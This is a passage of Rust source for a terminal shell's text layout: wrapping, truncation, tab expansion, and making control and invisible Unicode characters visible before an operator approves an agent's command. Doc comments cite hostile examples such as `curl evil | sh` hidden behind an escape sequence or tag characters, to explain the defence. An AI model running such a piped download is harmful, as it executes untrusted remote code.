// SPDX-License-Identifier: Apache-2.0
// Copyright (c) Viacheslav Shynkarenko

//! Wrapping, truncation, padding and tab expansion, done here rather than by
//! the widgets.
//!
//! The transcript scrolls, so the shell has to know how many lines a message
//! occupies before it draws it. A [`ratatui::widgets::Paragraph`] wraps
//! internally and does not say, which makes the scroll offset a guess. Wrapping
//! up front costs one pass over the text and makes the offset exact.

use ratatui::buffer::CellWidth as _;
use unicode_segmentation::UnicodeSegmentation as _;

/// Display width of a string in terminal cells, as ratatui will draw it.
///
/// Measured a grapheme at a time with ratatui's own measure, because a
/// string's width is not the sum of its characters': `❤️` is a heart and a
/// presentation selector, one cell apiece by character and two as the emoji
/// it draws; a family joined by zero-width joiners goes the other way. A
/// width summed by character put text in a line ratatui then clipped, and cut
/// a row that pushed the columns after it out of line.
pub fn width(text: &str) -> usize {
    if text.is_ascii() {
        return text.bytes().filter(|b| !b.is_ascii_control()).count();
    }
    graphemes(text).map(|(_, cells)| cells).sum()
}

/// Each grapheme cluster of `text` and the cells ratatui draws it in. A
/// cluster holding a control character draws in none: ratatui drops it.
pub(crate) fn graphemes(text: &str) -> impl DoubleEndedIterator<Item = (&str, usize)> {
    text.graphemes(true)
        .map(|grapheme| (grapheme, cells(grapheme)))
}

/// The cells one grapheme cluster is drawn in.
fn cells(grapheme: &str) -> usize {
    match grapheme.contains(char::is_control) {
        true => 0,
        false => usize::from(grapheme.cell_width()),
    }
}

/// Whether `c` is one of Unicode's tag characters, U+E0000–U+E007F.
pub(crate) fn is_tag(c: char) -> bool {
    ('\u{e0000}'..='\u{e007f}').contains(&c)
}

/// The subdivision flags Unicode recommends drawing, England's, Scotland's
/// and Wales's: the black flag, the subdivision's code in tag letters and
/// the cancel tag. Any other run of tags after the black flag draws as the
/// black flag alone, and the letters in it are words nobody sees.
const TAG_FLAGS: [&str; 3] = [
    "\u{1f3f4}\u{e0067}\u{e0062}\u{e0065}\u{e006e}\u{e0067}\u{e007f}",
    "\u{1f3f4}\u{e0067}\u{e0062}\u{e0073}\u{e0063}\u{e0074}\u{e007f}",
    "\u{1f3f4}\u{e0067}\u{e0062}\u{e0077}\u{e006c}\u{e0073}\u{e007f}",
];

/// Whether `glyph` is one of the subdivision flags a terminal draws. Tags
/// in any other glyph carry text that is drawn as nothing.
pub(crate) fn is_tag_flag(glyph: &str) -> bool {
    TAG_FLAGS.contains(&glyph)
}

/// Whether `glyph` is one of those flags or the start of one, as a flag
/// typed a key at a time is before its cancel tag arrives.
pub(crate) fn could_be_tag_flag(glyph: &str) -> bool {
    glyph.starts_with('\u{1f3f4}') && TAG_FLAGS.iter().any(|flag| flag.starts_with(glyph))
}

/// `text` with every control character in it shown rather than dropped: a C0
/// control by its Control Pictures glyph (`␛` for an escape, `␤` for a line
/// break, `␉` for a tab), DEL by `␡` and a C1 control by `�` — and every
/// character that draws as nothing yet carries text by `�` too.
///
/// For text the operator decides on, drawn on one line. Ratatui drops a
/// control character without a trace, so a value holding an escape would read
/// as the text around it, and a line break would start a row that looks like
/// one of the shell's own.
pub fn controls_shown(text: &str) -> std::borrow::Cow<'_, str> {
    shown_except(text, |_| false)
}

/// `text` with every control character shown but a line break and a tab,
/// which the caller lays out: [`wrap_exact`] starts a row at one and expands
/// the other to the next stop.
///
/// For text drawn in several rows that the operator is asked to approve: a
/// command, a file's lines, an argument's value. A control character dropped
/// from such text would let `echo safe␛[8m; curl evil | sh` read as a command
/// that is not the one that runs, and a carriage return would hide what
/// precedes it on a terminal that honours one.
pub fn controls_shown_in_rows(text: &str) -> std::borrow::Cow<'_, str> {
    shown_except(text, |c| matches!(c, '\n' | '\t'))
}

/// `text` with each control character but those `kept` shown by
/// [`control_shown`], and each character that draws as nothing yet carries
/// text by `�`.
///
/// Both kinds draw in no cell. A control acts on the terminal or is dropped;
/// a tag or an invisible format character is drawn as nothing, and a run of
/// them spells words — `echo hi` with ` && curl evil | sh` in tags after it
/// reads as `echo hi`, and a model given a file written so reads what the
/// operator never saw. Tags that spell a subdivision flag draw that flag, and
/// are kept within it.
fn shown_except(text: &str, kept: impl Fn(char) -> bool) -> std::borrow::Cow<'_, str> {
    // A question is drawn with every tick while it waits, over a write of
    // megabytes, so text with nothing to show — nearly all of it, and nearly
    // all ASCII — is passed a byte at a time where it can be, which the
    // compiler runs many bytes at once; anything else is walked once a
    // character at a time, never a grapheme at a time, which over megabytes
    // took a second a frame.
    let clean = match text.is_ascii() {
        true => !text
            .bytes()
            .any(|b| b.is_ascii_control() && !kept(char::from(b))),
        false => shown_where(text, &kept, None),
    };
    if clean {
        return std::borrow::Cow::Borrowed(text);
    }
    let mut shown = String::with_capacity(text.len());
    match text.is_ascii() {
        true => ascii_shown(text, &kept, &mut shown),
        false => {
            shown_where(text, &kept, Some(&mut shown));
        }
    }
    std::borrow::Cow::Owned(shown)
}

/// The ASCII `text` with each control in it but those `kept` shown, the
/// rest copied a run at a time.
fn ascii_shown(text: &str, kept: &impl Fn(char) -> bool, out: &mut String) {
    let mut copied = 0;
    for (at, byte) in text.bytes().enumerate() {
        let c = char::from(byte);
        if byte.is_ascii_control() && !kept(c) {
            out.push_str(text.get(copied..at).unwrap_or_default());
            out.push(control_shown(c));
            copied = at + 1;
        }
    }
    out.push_str(text.get(copied..).unwrap_or_default());
}

/// How many characters that take no cell may follow one that does before the
/// rest are shown: an accent or two, an emoji's selector and the joiners of
/// a family of four — and not a run that spells words in selectors, joiners
/// or marks stacked out of sight.
const ZERO_WIDTH_RUN: usize = 8;

/// Walks `text` once, writing it with what is hidden in it shown into `out`
/// where there is one, and says whether nothing in it was.
fn shown_where(text: &str, kept: &impl Fn(char) -> bool, mut out: Option<&mut String>) -> bool {
    use unicode_width::UnicodeWidthChar as _;

    let mut clean = true;
    let mut run = 0usize;
    // The character before the one at hand, as it was in `text`, and the
    // last one before it that takes a cell: a joiner after a selector or a
    // virama joins the glyph before them.
    let mut before: Option<char> = None;
    let mut glyph: Option<char> = None;
    // What of `text` is still to be copied into `out` as it stands, from here.
    let mut copied = 0;
    let mut chars = text.char_indices().peekable();
    while let Some((at, c)) = chars.next() {
        let shown = match c {
            c if kept(c) => c,
            '\u{1f3f4}' => {
                // A subdivision flag is the black flag and the tags after it
                // up to the cancel tag, which is one glyph, and is drawn.
                let end = text
                    .get(at..)
                    .unwrap_or_default()
                    .char_indices()
                    .skip(1)
                    .take_while(|(_, c)| is_tag(*c))
                    .take(8)
                    .last()
                    .map_or(at + c.len_utf8(), |(i, c)| at + i + c.len_utf8());
                let glyph = text.get(at..end).unwrap_or_default();
                if is_tag_flag(glyph) {
                    while chars.peek().is_some_and(|(i, _)| *i < end) {
                        chars.next();
                    }
                    run = 0;
                    continue;
                }
                c
            }
            c if c.is_control() => control_shown(c),
            c if draws_nothing(c) => '\u{fffd}',
            // A joiner shapes an emoji or a script only between two of
            // their glyphs; anywhere else, beside a letter of ASCII or
            // another joiner, it is drawn as nothing and carries a bit.
            '\u{200c}' | '\u{200d}' => {
                let after = chars.peek().map(|(_, c)| *c);
                match (glyph.is_some_and(shapes), after.is_some_and(shapes)) {
                    (true, true) => c,
                    (true | false, false) | (false, true) => '\u{fffd}',
                }
            }
            // A presentation selector selects how a glyph that has two looks
            // is drawn: after an emoji, or a digit, `#` or `*` that a keycap
            // follows. After anything else it selects nothing.
            '\u{fe0e}' | '\u{fe0f}' => {
                let after = chars.peek().map(|(_, c)| *c);
                let keycap = before.is_some_and(|b| matches!(b, '0'..='9' | '#' | '*'))
                    && after == Some('\u{20e3}');
                match keycap || before.is_some_and(shapes) {
                    true => c,
                    false => '\u{fffd}',
                }
            }
            c if c.width() == Some(0) => {
                run = run.saturating_add(1);
                match run > ZERO_WIDTH_RUN {
                    true => '\u{fffd}',
                    false => c,
                }
            }
            c => {
                run = 0;
                c
            }
        };
        before = Some(c);
        if c.width().is_some_and(|w| w > 0) {
            glyph = Some(c);
        }
        if shown != c {
            clean = false;
            let Some(out) = out.as_deref_mut() else {
                return false;
            };
            out.push_str(text.get(copied..at).unwrap_or_default());
            out.push(shown);
            copied = at + c.len_utf8();
        }
    }
    if let Some(out) = out {
        out.push_str(text.get(copied..).unwrap_or_default());
    }
    clean
}

/// Whether `c` is a glyph past ASCII that takes a cell, beside which a joiner
/// or a selector shapes what is drawn.
fn shapes(c: char) -> bool {
    use unicode_width::UnicodeWidthChar as _;

    !c.is_ascii() && c.width().is_some_and(|w| w > 0)
}

/// Whether `c` draws in no cell and can carry text a reader is not shown: a
/// tag outside the flag it spells, a variation selector that selects nothing
/// a terminal draws — the sixteen but the two an emoji takes, and the
/// supplement's — the zero-width space, the word joiner and the format
/// characters after it, the byte order mark, the soft hyphen, the combining
/// grapheme joiner, the Hangul fillers, the Khmer inherent vowels, the
/// Mongolian selectors and vowel separator, and the shorthand and musical
/// format controls.
///
/// The joiners an emoji or a script needs, U+200C and U+200D, and the two
/// presentation selectors are left to the run of characters that take no
/// cell: one or two of them shape what is drawn.
pub(crate) fn draws_nothing(c: char) -> bool {
    c >= '\u{ad}'
        && matches!(
            c,
            '\u{ad}'
                | '\u{34f}'
                | '\u{115f}'
                | '\u{1160}'
                | '\u{17b4}'
                | '\u{17b5}'
                | '\u{180b}'..='\u{180f}'
                | '\u{200b}'
                | '\u{2060}'..='\u{206f}'
                | '\u{3164}'
                | '\u{fe00}'..='\u{fe0d}'
                | '\u{feff}'
                | '\u{ffa0}'
                | '\u{1bca0}'..='\u{1bca3}'
                | '\u{1d173}'..='\u{1d17a}'
                | '\u{e0000}'..='\u{e0fff}'
        )
}

/// What [`controls_shown`] draws in place of `c`.
fn control_shown(c: char) -> char {
    match c {
        '\n' => '\u{2424}',
        '\u{0}'..='\u{1f}' => char::from_u32(0x2400 + u32::from(c)).unwrap_or('\u{fffd}'),
        '\u{7f}' => '\u{2421}',
        c if c.is_control() => '\u{fffd}',
        c => c,
    }
}

/// `text` followed by the spaces that make it `columns` cells wide, or
/// `text` alone where it is already as wide or wider.
///
/// For a column a span after it has to start at. `format!`'s own padding
/// counts characters, so a name in CJK, two cells to the character, came out
/// as wide again as its column and pushed everything after it out of line.
pub fn pad(text: &str, columns: usize) -> String {
    let fill = columns.saturating_sub(width(text));
    let mut out = String::with_capacity(text.len() + fill);
    out.push_str(text);
    out.extend(std::iter::repeat_n(' ', fill));
    out
}

/// Columns between tab stops where the shell expands a tab itself.
const TAB_STOP: usize = 4;

/// `line` with each tab replaced by the spaces that reach the next tab stop.
///
/// A terminal cell cannot hold a tab: ratatui drops it as a control
/// character, so tab-indented code would draw every level of its nesting in
/// one column. Stops rather than a fixed run of spaces, so a tab that lines up
/// a column mid-line still lines it up. Every four columns rather than the
/// terminal's eight, because a pane is narrower than the terminal and a code
/// line is cut, not rewrapped.
pub fn expand_tabs(line: &str) -> String {
    if !line.contains('\t') {
        return line.to_owned();
    }
    let mut out = String::with_capacity(line.len() + TAB_STOP);
    let mut column = 0;
    for (grapheme, w) in graphemes(line) {
        match grapheme {
            "\t" => {
                let fill = TAB_STOP - column % TAB_STOP;
                out.extend(std::iter::repeat_n(' ', fill));
                column += fill;
            }
            _ => {
                out.push_str(grapheme);
                column += w;
            }
        }
    }
    out
}

/// Wraps `text` to `columns` cells, breaking on whitespace where it can and
/// mid-word where a single word is wider than the line.
///
/// Explicit newlines are kept. An empty line stays an empty line, so a message
/// with a blank line between paragraphs still reads as one.
pub fn wrap(text: &str, columns: usize) -> Vec<String> {
    wrap_rows(text, columns, |_| false)
}

/// [`wrap`], with each row cut into pieces that say whether they lie in one
/// of `marked`, byte ranges of `text`: a word counts as marked where it
/// starts inside one. The blank between two words goes with the piece before
/// it.
pub fn wrap_marked(
    text: &str,
    columns: usize,
    marked: &[std::ops::Range<usize>],
) -> Vec<Vec<(String, bool)>> {
    wrap_rows(text, columns, |at| {
        marked.iter().any(|range| range.contains(&at))
    })
}

/// What [`wrap`] builds a row into: a plain string, or pieces that each say
/// whether they are marked.
trait Row: Default {
    fn push_word(&mut self, word: &str, marked: bool);
    fn push_blank(&mut self);
}

impl Row for String {
    fn push_word(&mut self, word: &str, _: bool) {
        self.push_str(word);
    }

    fn push_blank(&mut self) {
        self.push(' ');
    }
}

impl Row for Vec<(String, bool)> {
    fn push_word(&mut self, word: &str, marked: bool) {
        match self.last_mut() {
            Some((piece, was)) if *was == marked => piece.push_str(word),
            _ => self.push((word.to_owned(), marked)),
        }
    }

    fn push_blank(&mut self) {
        match self.last_mut() {
            Some((piece, _)) => piece.push(' '),
            None => self.push((" ".to_owned(), false)),
        }
    }
}

fn wrap_rows<R: Row>(text: &str, columns: usize, marked: impl Fn(usize) -> bool) -> Vec<R> {
    if columns == 0 || text.is_empty() {
        return Vec::new();
    }

    let mut lines = Vec::new();
    let mut start = 0;
    for paragraph in text.split('\n') {
        let before = lines.len();
        wrap_paragraph(paragraph, columns, &mut lines, |at| marked(start + at));
        if lines.len() == before {
            lines.push(R::default());
        }
        start += paragraph.len() + 1;
    }
    lines
}

fn wrap_paragraph<R: Row>(
    paragraph: &str,
    columns: usize,
    lines: &mut Vec<R>,
    marked: impl Fn(usize) -> bool,
) {
    let mut line = R::default();
    let mut line_width = 0;

    for (at, word) in words(paragraph) {
        let word_width = width(word);
        let mark = marked(at);

        if line_width != 0 && line_width + 1 + word_width > columns {
            lines.push(std::mem::take(&mut line));
            line_width = 0;
        }

        if word_width > columns {
            // A single word wider than the line: spill it across as many lines
            // as it needs rather than letting it run off the pane.
            if line_width != 0 {
                lines.push(std::mem::take(&mut line));
                line_width = 0;
            }
            for chunk in split_to_width(word, columns) {
                if line_width != 0 {
                    lines.push(std::mem::take(&mut line));
                }
                line_width = width(chunk);
                line.push_word(chunk, mark);
            }
            continue;
        }

        if line_width != 0 {
            line.push_blank();
            line_width += 1;
        }
        line.push_word(word, mark);
        line_width += word_width;
    }

    if line_width != 0 {
        lines.push(line);
    }
}

/// The words of `text` split at blanks, each with the byte it starts at.
fn words(text: &str) -> impl Iterator<Item = (usize, &str)> {
    text.split(char::is_whitespace)
        .scan(0, |start, word| {
            let at = *start;
            *start += word.len();
            *start += text[*start..].chars().next().map_or(0, char::len_utf8);
            Some((at, word))
        })
        .filter(|(_, word)| !word.is_empty())
}

/// Wraps `text` to `columns` cells keeping every character it has: each
/// space, each indent and each blank line, with tabs expanded to their stops.
/// A line breaks only where it reaches the column, mid-word if that is where.
///
/// For what the operator is asked to approve. [`wrap`] joins words with one
/// space, so a quoted `"a    b"` would read as `"a b"` and an indented Python
/// or YAML body as one flush column — a different command from the one that
/// would run. Breaking only at the column also keeps a line break honest:
/// every row but a line's last is full, so a run of spaces never hides at the
/// end of a row cut short. A control character other than a line break and a
/// tab is shown by its glyph, as [`controls_shown_in_rows`] does, since a
/// dropped one would be an approval of bytes nobody saw.
pub fn wrap_exact(text: &str, columns: usize) -> Vec<String> {
    if columns == 0 || text.is_empty() {
        return Vec::new();
    }
    let text = controls_shown_in_rows(text);
    let mut lines = Vec::new();
    for line in text.split('\n') {
        match line.is_empty() {
            true => lines.push(String::new()),
            false => lines.extend(
                split_to_width(&expand_tabs(line), columns)
                    .into_iter()
                    .map(str::to_owned),
            ),
        }
    }
    lines
}

/// [`wrap_exact`], breaking a line between words where one is there to
/// break at: after a space that stands alone between two words, or after a
/// `/`, so a path wraps at a directory and prose at a word. A line with no
/// such place in a row's width breaks at the column, as [`wrap_exact`]
/// does.
///
/// Still every character is kept and drawn. A row cut short ends in the
/// one space it broke at, never a run of them — a run is broken only where
/// it reaches the column — so the text reads back as written.
///
/// For the agent's words and the change it would make, read before they are
/// approved: a word cut in two at the frame reads as two. A line longer than
/// [`WORD_BREAK_BYTES`] is broken at the column, as a minified bundle or a
/// data line is no prose to read, and walking one by word with every
/// layout would cost a frame.
pub fn wrap_words_exact(text: &str, columns: usize) -> Vec<String> {
    wrap_words_exact_first(text, columns, usize::MAX)
}

/// The first `rows` rows of [`wrap_words_exact`]'s, without laying out the
/// rest: see [`wrap_exact_first`].
pub fn wrap_words_exact_first(text: &str, columns: usize, rows: usize) -> Vec<String> {
    let mut shown = Vec::new();
    if columns == 0 || text.is_empty() {
        return shown;
    }
    for line in text.split('\n') {
        let left = rows.saturating_sub(shown.len());
        if left == 0 {
            break;
        }
        let shown_line = controls_shown_in_rows(line);
        let line = tabs_expanded(&shown_line);
        match line.is_empty() {
            true => shown.push(String::new()),
            false => shown.extend(
                row_pieces(&line, columns, left)
                    .into_iter()
                    .map(str::to_owned),
            ),
        }
    }
    shown
}

/// How many rows [`wrap_words_exact`] makes of `text`, without making the
/// rows of a line past [`WORD_BREAK_BYTES`], which [`wrap_exact_rows`]
/// counts as it breaks them.
pub fn wrap_words_exact_rows(text: &str, columns: usize) -> usize {
    if columns == 0 || text.is_empty() {
        return 0;
    }
    controls_shown_in_rows(text)
        .split('\n')
        .map(|line| match line.len() > WORD_BREAK_BYTES {
            true => wrap_exact_rows(line, columns),
            false => {
                let line = tabs_expanded(line);
                row_pieces(&line, columns, usize::MAX).len().max(1)
            }
        })
        .fold(0, usize::saturating_add)
}

/// The longest line, in bytes, that [`wrap_words_exact`] breaks between
/// words.
pub const WORD_BREAK_BYTES: usize = 4_096;

/// The first `rows` of `line` — one line, its controls shown and its tabs
/// expanded — in rows no wider than `columns`, broken between words where
/// it can be: see [`wrap_words_exact`]. A line past [`WORD_BREAK_BYTES`] is
/// cut only as far as `rows`, since it can be megabytes.
fn row_pieces(line: &str, columns: usize, rows: usize) -> Vec<&str> {
    if line.len() > WORD_BREAK_BYTES {
        return chunks_to_width(line, columns).take(rows).collect();
    }
    let cells: Vec<(usize, &str, usize)> = {
        let mut at = 0;
        graphemes(line)
            .map(|(grapheme, width)| {
                let start = at;
                at += grapheme.len();
                (start, grapheme, width)
            })
            .collect()
    };
    let mut pieces = Vec::new();
    let mut start = 0;
    let mut width = 0;
    // Where the row could break: the byte after the place, and the row's
    // width up to it.
    let mut place: Option<(usize, usize)> = None;
    for (index, &(at, grapheme, cells_wide)) in cells.iter().enumerate() {
        while width + cells_wide > columns && at > start {
            match place.take() {
                Some((after, upto)) if after > start => {
                    pieces.push(&line[start..after]);
                    start = after;
                    width -= upto;
                }
                _ => {
                    pieces.push(&line[start..at]);
                    start = at;
                    width = 0;
                }
            }
        }
        width += cells_wide;
        let before = index.checked_sub(1).and_then(|before| cells.get(before));
        let after = cells.get(index + 1);
        let alone = |neighbour: Option<&(usize, &str, usize)>| {
            neighbour.is_some_and(|(_, grapheme, _)| *grapheme != " ")
        };
        let breaks = match grapheme {
            " " => alone(before) && alone(after),
            "/" => after.is_some(),
            _ => false,
        };
        if breaks {
            place = Some((at + grapheme.len(), width));
        }
    }
    if start < line.len() {
        pieces.push(&line[start..]);
    }
    pieces.truncate(rows);
    pieces
}

/// [`wrap`] where it loses nothing, and [`wrap_exact`] where it would: words
/// joined by one space read as they were written unless the text has a run
/// of spaces, a tab or a space at either end, which is then kept.
///
/// For a value the operator approves, where `a    b` and `a b` are two
/// different strings: a pattern, a path, a quoted argument.
pub fn wrap_keeping_spaces(text: &str, columns: usize) -> Vec<String> {
    let loses_something =
        text.contains("  ") || text.contains('\t') || text.starts_with(' ') || text.ends_with(' ');
    match loses_something {
        true => wrap_exact(text, columns),
        false => wrap(text, columns),
    }
}

/// Cuts a string into pieces no wider than `columns` cells, each a slice of
/// `text`, so that cutting allocates nothing but the list.
pub fn split_to_width(text: &str, columns: usize) -> Vec<&str> {
    chunks_to_width(text, columns).collect()
}

/// The pieces [`split_to_width`] cuts `text` into, each cut only as it is
/// asked for, so that a caller wanting the first few of a long line does not
/// pay for the rest.
fn chunks_to_width(text: &str, columns: usize) -> impl Iterator<Item = &str> {
    let mut cells = graphemes(text).peekable();
    let mut start = 0;
    std::iter::from_fn(move || {
        let (mut end, mut chunk_width) = (start, 0);
        while let Some(&(grapheme, w)) = cells.peek() {
            if chunk_width + w > columns && start < end {
                break;
            }
            cells.next();
            end += grapheme.len();
            chunk_width += w;
        }
        let chunk = text.get(start..end).filter(|chunk| !chunk.is_empty())?;
        start = end;
        Some(chunk)
    })
}

/// The first `rows` rows of [`wrap_exact`]'s, without laying out the rest.
///
/// For text drawn in a box of a few rows: a prompt read in from a `claude`
/// session can be a megabyte, and laid out whole it took more than three
/// frames to draw. [`wrap_exact_rows`] says how many rows there are in all.
pub fn wrap_exact_first(text: &str, columns: usize, rows: usize) -> Vec<String> {
    let mut shown = Vec::new();
    if columns == 0 || text.is_empty() {
        return shown;
    }
    // Each line's controls are shown as it is reached rather than the whole
    // text's first: a line break is not one of them, so it is the same
    // text, and the lines past the rows asked for are never read.
    for line in text.split('\n') {
        let left = rows.saturating_sub(shown.len());
        if left == 0 {
            break;
        }
        match line.is_empty() {
            true => shown.push(String::new()),
            false => shown.extend(
                chunks_to_width(&tabs_expanded(&controls_shown_in_rows(line)), columns)
                    .take(left)
                    .map(str::to_owned),
            ),
        }
    }
    shown
}

/// How many rows [`wrap_exact`] makes of `text`, without making them.
///
/// A line that is all ASCII once its controls are shown and its tabs
/// expanded is a cell a byte, so its rows are counted from its length.
pub fn wrap_exact_rows(text: &str, columns: usize) -> usize {
    if columns == 0 || text.is_empty() {
        return 0;
    }
    controls_shown_in_rows(text)
        .split('\n')
        .map(|line| {
            let line = tabs_expanded(line);
            match (line.is_empty(), line.is_ascii()) {
                (true, _) => 1,
                (false, true) => line.len().div_ceil(columns),
                (false, false) => rows_of(&line, columns),
            }
        })
        .fold(0, usize::saturating_add)
}

/// How many rows [`chunks_to_width`] cuts `line` into, counted without
/// cutting it: a run of ASCII is a cell a byte and is counted by arithmetic,
/// and only what is not ASCII, with the byte on either side of it that a
/// mark or a prefix can join to it, is walked by grapheme.
///
/// A question counts every row of what it would do on every frame, and one
/// character past ASCII in a line of megabytes made that a walk of the whole
/// line by grapheme, a third of a second a frame. `line` holds no control
/// character or tab, which [`controls_shown_in_rows`] and the tab expansion
/// have taken out, so every ASCII byte in it is a cell.
fn rows_of(line: &str, columns: usize) -> usize {
    let mut rows = Rows {
        columns,
        done: 0,
        width: 0,
        open: false,
    };
    let bytes = line.as_bytes();
    let mut at = 0;
    while at < bytes.len() {
        let ascii = bytes
            .get(at..)
            .unwrap_or_default()
            .iter()
            .take_while(|b| b.is_ascii())
            .count();
        // The last byte of a run of ASCII goes with what follows it, which
        // may be a mark that joins it, unless the line ends there.
        let fast = match at + ascii == bytes.len() {
            true => ascii,
            false => ascii.saturating_sub(1),
        };
        rows.cells(fast);
        at += fast;
        let mut end = at;
        while end < bytes.len() {
            let next_ascii = bytes
                .get(end..)
                .unwrap_or_default()
                .iter()
                .take_while(|b| b.is_ascii())
                .count();
            match next_ascii {
                // Not ASCII: on to its end.
                0 => {
                    end += line
                        .get(end..)
                        .and_then(|rest| rest.chars().next())
                        .map_or(1, char::len_utf8)
                }
                // A byte or two of ASCII between what is not: walked with it,
                // since a prefix before it or a mark after it can join it.
                1 | 2 if end + next_ascii < bytes.len() => end += next_ascii,
                // The first byte of a longer run goes with what came before,
                // which may be a prefix that joins it.
                _ => {
                    end += 1;
                    break;
                }
            }
        }
        if end > at {
            for (_, w) in graphemes(line.get(at..end).unwrap_or_default()) {
                rows.cell_of(w);
            }
            at = end;
        }
    }
    rows.count()
}

/// The rows [`chunks_to_width`] would cut, counted a cell at a time.
struct Rows {
    columns: usize,
    /// Rows already full.
    done: usize,
    /// The cells of the row being filled.
    width: usize,
    /// Whether that row holds anything.
    open: bool,
}

impl Rows {
    /// One grapheme `w` cells wide.
    fn cell_of(&mut self, w: usize) {
        if self.open && self.width + w > self.columns {
            self.done += 1;
            self.width = 0;
        }
        self.width += w;
        self.open = true;
    }

    /// `n` graphemes a cell wide each.
    fn cells(&mut self, n: usize) {
        if n == 0 {
            return;
        }
        if self.open && self.width >= self.columns {
            self.done += 1;
            self.width = 0;
            self.open = false;
        }
        let room = self.columns - self.width;
        if n <= room {
            self.width += n;
        } else {
            let past = n - room;
            self.done += 1 + (past - 1) / self.columns;
            self.width = (past - 1) % self.columns + 1;
        }
        self.open = true;
    }

    fn count(&self) -> usize {
        self.done + usize::from(self.open)
    }
}

/// `line` as [`expand_tabs`] makes it, copied only where it has a tab.
fn tabs_expanded(line: &str) -> std::borrow::Cow<'_, str> {
    match line.contains('\t') {
        true => std::borrow::Cow::Owned(expand_tabs(line)),
        false => std::borrow::Cow::Borrowed(line),
    }
}

/// Shortens `text` to `columns` cells, ending in `…` when anything was cut.
pub fn truncate(text: &str, columns: usize) -> String {
    let line = one_line(text);
    let text: &str = &line;
    // Measured only as far as the first cell past `columns`, so a row cut
    // from a megabyte of text costs a row: everything past it is cut anyway.
    let (mut used, mut kept, mut end) = (0usize, 0, 0);
    for (grapheme, w) in graphemes(text) {
        used = used.saturating_add(w);
        if used > columns {
            return match columns {
                0 => String::new(),
                1 => "…".to_owned(),
                _ => format!("{}…", text.get(..kept).unwrap_or_default()),
            };
        }
        end += grapheme.len();
        if used < columns {
            kept = end;
        }
    }
    text.to_owned()
}

/// `text` with each tab a space and each line break a `↵`, for a row drawn
/// on one line.
///
/// A terminal cell cannot hold a tab, and a width that counted one as no
/// cells would cut the row in the wrong place; a single row has no column
/// for a tab stop to line up either, so it is the space it separates words
/// with. A line break is dropped by the terminal the same way, which would
/// join the words either side of it — `set -e` and `cd /tmp` would read as
/// `set -ecd /tmp` — so it is drawn as the mark that says one was there.
fn one_line(text: &str) -> std::borrow::Cow<'_, str> {
    if !text.contains(['\t', '\n', '\r']) {
        return std::borrow::Cow::Borrowed(text);
    }
    std::borrow::Cow::Owned(
        text.replace("\r\n", "\n")
            .replace(['\n', '\r'], LINE_BREAK)
            .replace('\t', " "),
    )
}

/// What a line break reads as on a row drawn on one line.
const LINE_BREAK: &str = " ↵ ";

/// Shortens `text` to `columns` cells at a word boundary, ending in `…` when
/// anything was cut.
///
/// For a phrase, where half a word reads as a different word. A first word
/// that is itself wider than the room is cut inside it, as [`truncate`] would:
/// a caption of nothing but the ellipsis says less than part of a word.
pub fn truncate_words(text: &str, columns: usize) -> String {
    let line = one_line(text);
    let text: &str = &line;
    if width(text) <= columns {
        return text.to_owned();
    }
    let room = columns.saturating_sub(1);
    let mut kept = "";
    for (at, _) in text.match_indices(char::is_whitespace) {
        let before = text[..at].trim_end();
        if width(before) > room {
            break;
        }
        kept = before;
    }
    match kept.is_empty() {
        true => truncate(text, columns),
        false => format!("{kept}…"),
    }
}

/// Shortens `text` to `columns` cells by cutting the **front**, starting in
/// `…` when anything was cut.
///
/// For a path, which is what this is for: the file's own name and the
/// directory it sits in are what tell two rows apart, and they are at the end.
pub fn truncate_start(text: &str, columns: usize) -> String {
    let line = one_line(text);
    let text: &str = &line;
    if width(text) <= columns {
        return text.to_owned();
    }
    if columns == 0 {
        return String::new();
    }
    if columns == 1 {
        return "…".to_owned();
    }

    let mut kept: Vec<&str> = Vec::new();
    let mut kept_width = 0;
    for (grapheme, w) in graphemes(text).rev() {
        if kept_width + w > columns - 1 {
            break;
        }
        kept.push(grapheme);
        kept_width += w;
    }
    std::iter::once("…").chain(kept.into_iter().rev()).collect()
}

/// The rows the composer draws one line of its text in, `columns` cells wide,
/// with tabs stopping every `tab` cells.
///
/// The composer's height is set from this before the editor draws, and the
/// editor scrolls whatever does not fit, so the count follows the editor's own
/// word-or-glyph rule exactly rather than [`wrap`]'s: a line breaks before the
/// word that would overflow the row, and only a word wider than the whole row
/// is cut, a grapheme at a time. Widths are summed by character, as the editor
/// sums them, since a count that disagrees with it by one row hides that row.
pub fn editor_rows(line: &str, columns: usize, tab: u8) -> usize {
    let columns = columns.max(1);
    let words: Vec<&str> = line.split_word_bounds().collect();
    let mut rows = 0usize;
    let mut row_width = 0usize;
    let mut row_open = false;
    let mut next = 0usize;
    while let Some(word) = words.get(next) {
        let word_width = advance(word, row_width, tab).saturating_sub(row_width);
        if row_width.saturating_add(word_width) <= columns {
            row_width += word_width;
            row_open = true;
            next += 1;
        } else if row_open {
            rows += 1;
            row_width = 0;
            row_open = false;
        } else {
            rows += glyph_rows(word, columns, tab);
            next += 1;
        }
    }
    rows + usize::from(row_open || rows == 0)
}

/// Where the composer draws the characters `wanted` of one line of its text —
/// ranges of characters, in order and apart — `columns` cells wide with tabs
/// stopping every `tab` cells: for each, the row of the line it is drawn on,
/// the column it starts at and the cells it takes, in order.
///
/// The same word-or-glyph rule as [`editor_rows`] picks the row, since that is
/// how the editor breaks its lines; the column on the row is where ratatui
/// then draws the row, a grapheme at a time by its own measure. The two differ
/// after a glyph made of several characters — a family joined by zero-width
/// joiners, a flag, `❤️` — and a column summed by character put a command's
/// colour on the cells after it. Walked once for every range and only as far
/// as the last character wanted, so a line naming many commands costs one
/// walk of it.
pub fn editor_spots(
    line: &str,
    columns: usize,
    tab: u8,
    wanted: &[std::ops::Range<usize>],
) -> Vec<(usize, usize, usize)> {
    let columns = columns.max(1);
    let end = wanted.last().map_or(0, |range| range.end);
    let mut spots = Vec::new();
    let mut range = 0usize;
    let mut at = 0usize;
    let mut row = 0usize;
    // Where the next grapheme goes on the row: by the editor's character sum,
    // which its tab stops count from, and by the cells ratatui draws in.
    let mut row_width = 0usize;
    let mut drawn = 0usize;
    let mut place =
        |grapheme: &str, at: &mut usize, row: usize, summed: usize, drawn: &mut usize| {
            let cells = match grapheme {
                "\t" => advance(grapheme, summed, tab).saturating_sub(summed),
                _ => self::cells(grapheme),
            };
            for (i, _) in grapheme.chars().enumerate() {
                while wanted.get(range).is_some_and(|wanted| wanted.end <= *at) {
                    range += 1;
                }
                if wanted.get(range).is_some_and(|wanted| wanted.contains(at)) {
                    spots.push((row, *drawn, if i == 0 { cells } else { 0 }));
                }
                *at += 1;
            }
            *drawn += cells;
            advance(grapheme, summed, tab)
        };
